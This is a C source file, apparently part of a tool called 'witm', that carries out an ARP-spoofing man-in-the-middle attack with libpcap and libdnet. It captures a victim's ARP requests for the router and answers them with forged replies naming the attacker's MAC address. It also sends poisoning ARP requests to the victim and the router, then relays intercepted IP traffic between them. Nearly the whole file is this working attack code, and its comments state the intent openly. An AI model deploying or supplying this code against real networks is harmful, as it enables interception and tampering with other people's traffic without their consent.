#include <stdio.h>
#include <stdlib.h>
#include <pcap.h> // to capture packets
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#include <string.h> // for eth_pack_hdr which uses memmove
#include <dnet.h> // to interprete the captures

#include "witm.h"

extern pcap_t *handle;
extern eth_addr_t my_mac_addr;
extern eth_addr_t victim_mac_addr;

struct arp_response {
	struct eth_hdr ethernet_header;
	struct arp_hdr arp_header;
	struct arp_ethip arp_payload;
} __attribute__((__packed__));

void arp_answer(eth_addr_t victim_mac, uint8_t *victim_ip, uint8_t *router_ip) {

	struct arp_response packet;
	int ret;

	uint32_t victim_ip2;
	uint32_t router_ip2;

	victim_ip2 = *(uint32_t *)victim_ip;
	router_ip2 = *(uint32_t *)router_ip;

//	printf("victim_ip2 : %02hhX %02hhX %02hhX %02hhX\n", *(uint8_t *)&victim_ip2, *((uint8_t *)&victim_ip2 + 1), *((uint8_t *)&victim_ip2 + 2), *((uint8_t *)&victim_ip2 + 3));
//	printf("router_ip2 : %02hhX %02hhX %02hhX %02hhX\n", *(uint8_t *)&router_ip2, *((uint8_t *)&router_ip2 + 1), *((uint8_t *)&router_ip2 + 2), *((uint8_t *)&router_ip2 + 3));

	eth_pack_hdr(&packet.ethernet_header, victim_mac, my_mac_addr, ETH_TYPE_ARP);
	arp_pack_hdr_ethip(&packet.arp_header, ARP_OP_REPLY, my_mac_addr, router_ip2, victim_mac, victim_ip2);
	
	ret = pcap_sendpacket(handle, (u_char *)&packet, sizeof(struct arp_response));
	if (ret < 0) {
		printf("ERROR : failed to send the forged arp answer !\n");
		exit(1);
	}
}

void print_mac_address(eth_addr_t addr) {
	int i;
	for (i = 0 ; i < ETH_ADDR_LEN ; i++) {
		printf("%02X", addr.data[i]);
		if (i < ETH_ADDR_LEN - 1)
			printf(":");
	}
}

void string_to_ip_addr(char *string, ip_addr_t *ip) {
	sscanf(string, "%hhd.%hhd.%hhd.%hhd", (uint8_t *)ip + 3, (uint8_t *)ip + 2, (uint8_t *)ip + 1, (uint8_t *)ip);
/*
	printf("ip[0] = %d = %02X", *(uint8_t *)ip, *(uint8_t *)ip);
	printf("ip[1] = %d = %02X", *(uint8_t *)ip + 1, *(uint8_t *)ip + 1);
	printf("ip[2] = %d = %02X", *(uint8_t *)ip + 2, *(uint8_t *)ip + 2);
	printf("ip[3] = %d = %02X", *(uint8_t *)ip + 3, *(uint8_t *)ip + 3);
*/
}

void string_to_mac_addr(char *string, eth_addr_t *addr) {
	sscanf(string, "%02hhX:%02hhX:%02hhX:%02hhX:%02hhX:%02hhX", &addr->data[0], &addr->data[1], &addr->data[2], &addr->data[3], &addr->data[4], &addr->data[5]);
}

void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet) {

//	printf(">args = %s\n", args);
//	printf("Got a packet with length of [%d]\n", header->len);

	struct eth_hdr eth_pack;
	eth_addr_t router_mac_addr;
	uint16_t type;
	ip_addr_t router_ip_addr;
	ip_addr_t my_ip_addr;
	char *my_ip_string;
	char *arguments = strdup((char *)args);
	char *ip_router_string;
	char *mac_router_string;
	char *my_mac;
	eth_addr_t null_addr;

	memset(&null_addr, 0x0, ETH_ADDR_LEN);

	// We retrieve the mac & ip address of the router (as strings)
	ip_router_string = strtok(arguments, ";");
	mac_router_string = strtok(NULL, ";");
	my_mac = strtok(NULL, ";");
	my_ip_string = strtok(NULL, ";");

	if (ip_router_string == NULL) {
		printf("ip_router_string == NULL\n");
		exit(1);
	}

	if (mac_router_string == NULL) {
		printf("mac_router_string == NULL\n");
		exit(1);
	}

	if (my_mac == NULL) {
		printf("my_mac == NULL\n");
		exit(1);
	}

	if (my_ip_string == NULL) {
		printf("my_ip == NULL\n");
		exit(1);
	}

	// We translate the strings into real addresses
	string_to_mac_addr(mac_router_string, &router_mac_addr);
	string_to_ip_addr(ip_router_string, &router_ip_addr);
	string_to_mac_addr(my_mac, &my_mac_addr);
	string_to_ip_addr(my_ip_string, &my_ip_addr);

	free(arguments);

	// We fill the eth_pack struct with the ethernet header of our packet
	memcpy(&eth_pack, packet, sizeof(struct eth_hdr));

	type = ntohs(eth_pack.eth_type);
//	type = eth_pack.eth_type >> 8;
//	type |= eth_pack.eth_type << 8;

/*	printf("src : ");
	print_mac_address(eth_pack.eth_src);
	printf(" ; dst : ");
	print_mac_address(eth_pack.eth_dst);
	printf(" ; type : %04X\n", type);
*/
	if (type == ETH_TYPE_ARP) {
		struct arp_hdr arp_header;
		struct arp_ethip arp_payload;
		uint16_t opcode;
		uint32_t target_ip_addr;
		memcpy(&arp_header, packet + sizeof(struct eth_hdr), sizeof(struct arp_hdr));
		memcpy(&arp_payload, packet + sizeof(struct eth_hdr) + sizeof(struct arp_hdr), sizeof(struct arp_ethip));

		opcode = ntohs(arp_header.ar_op);

		target_ip_addr = ntohl(*(uint32_t *)arp_payload.ar_tpa);
//		printf("\ntarget_ip_addr = 0x%08X\n", target_ip_addr);
//		printf("\nrouter_id_addr = 0x%08X\n", router_ip_addr);

//		printf("\t[ARP (opcode = 0x%04X) detected]\n", opcode);
		// if it's a request from the victim to get the router mac addr
		if ( (memcmp(&router_ip_addr, &target_ip_addr, IP_ADDR_LEN) == 0) && (opcode == ARP_OP_REQUEST) ) {
//			printf("\t\t[Intercepted ARP request for the Router] we gotta answer !\n\n");
			printf("+");
			// we answer our mac addr to the victim, we tell him we are the router
			arp_answer(eth_pack.eth_src, arp_payload.ar_spa, arp_payload.ar_tpa);
			arp_answer(eth_pack.eth_src, arp_payload.ar_spa, arp_payload.ar_tpa);
			// we ask the victim what is it's mac addr, saying we are the router
			arp_request(eth_pack.eth_src, my_mac_addr, my_mac_addr, ntohl(router_ip_addr), null_addr, *(uint32_t *)arp_payload.ar_spa);
			// we ask the router his mac addr, saying we are the victim
			arp_request(router_mac_addr, my_mac_addr, my_mac_addr, *(uint32_t *)arp_payload.ar_spa, null_addr, ntohl(router_ip_addr));

		}
	} else if (type == ETH_TYPE_IP) {
		struct ip_hdr ip_header;
		memcpy(&ip_header, packet + sizeof(struct eth_hdr), sizeof(struct ip_hdr));

		if ((memcmp(my_mac_addr.data, eth_pack.eth_dst.data, ETH_ADDR_LEN) == 0) && (ip_header.ip_dst != my_ip_addr)) {
			printf("On va devoir forward !\n");
			if (memcmp(eth_pack.eth_src.data, router_mac_addr.data, ETH_ADDR_LEN) != 0) {
				printf("On forward vers le routeur\n");
				forward(packet, header->len, router_mac_addr);
			} else {
				printf("On forward vers la victime\n");
				forward(packet, header->len, victim_mac_addr);
			}
		}

	}


}
